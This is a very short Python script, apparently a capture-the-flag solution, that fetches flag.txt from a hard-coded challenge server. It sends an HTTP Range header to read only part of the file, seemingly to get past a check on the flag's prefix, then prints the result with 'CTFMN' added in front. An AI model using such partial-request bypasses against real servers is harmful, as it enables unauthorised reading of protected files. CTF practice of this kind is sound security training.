import requests

session = requests.Session()
r = session.get(f"http://139.162.5.230:10372/flag.txt", headers={"Range": "bytes=5-50"})

print("CTFMN" + r.content.decode())